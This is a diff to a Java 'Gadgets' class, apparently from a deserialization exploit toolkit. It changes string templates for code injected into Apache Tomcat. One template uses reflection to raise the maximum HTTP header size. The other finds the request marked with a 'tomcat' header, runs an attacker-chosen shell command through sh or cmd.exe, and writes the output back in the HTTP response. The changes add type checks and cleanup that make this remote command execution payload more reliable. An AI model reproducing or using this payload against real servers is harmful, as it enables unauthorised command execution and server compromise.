@@ -112,7 +112,9 @@ public class Gadgets {
             "            for (int i=0;i<connectors.length;i++) {\n" +
             "                if (4==connectors[i].getScheme().length()) {\n" +
             "                    org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();\n" +
+            "                   if (protocolHandler instanceof org.apache.coyote.http11.AbstractHttp11Protocol) {\n"+
             "                    ((org.apache.coyote.http11.AbstractHttp11Protocol)protocolHandler).setMaxHttpHeaderSize("+command+");\n" +
+            "                   }\n"+
             "                }\n" +
             "            }\n" +
             "        }catch (Exception e){\n" +
@@ -124,7 +126,6 @@ public class Gadgets {
         String template = "try {\n" +
             "            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField(\"context\");\n" +
             "            java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField(\"service\");\n" +
-            "            java.lang.reflect.Field connectorsField = org.apache.catalina.core.StandardService.class.getDeclaredField(\"connectors\");\n" +
             "            java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField(\"req\");\n" +
             "            java.lang.reflect.Field handlerField = org.apache.coyote.AbstractProtocol.class.getDeclaredField(\"handler\");\n" +
             "            contextField.setAccessible(true);\n" +
@@ -139,33 +140,36 @@ public class Gadgets {
             "            for (int i=0;i<connectors.length;i++) {\n" +
             "                if (4==connectors[i].getScheme().length()) {\n" +
             "                    org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();\n" +
+            "                    if (protocolHandler instanceof org.apache.coyote.http11.AbstractHttp11Protocol) {\n" +
             "                        Class[] classes = org.apache.coyote.AbstractProtocol.class.getDeclaredClasses();\n" +
-            "                        for (int j=0;j<classes.length;j++) {\n" +
+            "                        for (int j = 0; j < classes.length; j++) {\n" +
             "                            if (52 == (classes[j].getName().length())) {\n" +
             "                                java.lang.reflect.Field globalField = classes[j].getDeclaredField(\"global\");\n" +
             "                                java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField(\"processors\");\n" +
             "                                globalField.setAccessible(true);\n" +
             "                                processorsField.setAccessible(true);\n" +
             "                                org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(handlerField.get(protocolHandler));\n" +
-            "                                java.util.List list = (java.util.List)processorsField.get(requestGroupInfo);\n" +
-            "                                for (int k=0;k<list.size();k++) {\n" +
+            "                                java.util.List list = (java.util.List) processorsField.get(requestGroupInfo);\n" +
+            "                                for (int k = 0; k < list.size(); k++) {\n" +
             "                                    org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(list.get(k));\n" +
             "                                    if (\"tomcat\".equals(tempRequest.getHeader(\"tomcat\"))) {\n" +
             "                                        org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);\n" +
-            "                                        String cmd = \""+command+"\";\n" +
-            "                                        String[] cmds = !System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? new String[]{\"sh\", \"-c\", cmd} : new String[]{\"cmd.exe\", \"/c\", cmd} ;" +
+            "                                        String cmd = \"" + command+"\";\n" +
+            "                                        String[] cmds = !System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? new String[]{\"sh\", \"-c\", cmd} : new String[]{\"cmd.exe\", \"/c\", cmd};\n" +
             "                                        java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();\n" +
             "                                        java.util.Scanner s = new java.util.Scanner(in).useDelimiter(\"\\\\a\");\n" +
-            "                                        String output = s.hasNext() ? s.next():\"\";\n" +
+            "                                        String output = s.hasNext() ? s.next() : \"\";\n" +
             "                                        java.io.Writer writer = request.getResponse().getWriter();\n" +
             "                                        java.lang.reflect.Field usingWriter = request.getResponse().getClass().getDeclaredField(\"usingWriter\");\n" +
             "                                        usingWriter.setAccessible(true);\n" +
-            "                                        usingWriter.set(request.getResponse(),Boolean.FALSE);\n" +
+            "                                        usingWriter.set(request.getResponse(), Boolean.FALSE);\n" +
             "                                        writer.write(output);\n" +
             "                                        writer.flush();\n" +
             "                                        break;\n" +
             "                                    }\n" +
             "                                }\n" +
+            "                                break;\n" +
+            "                            }\n" +
             "                        }\n" +
             "                    }\n" +
             "                    break;\n" +
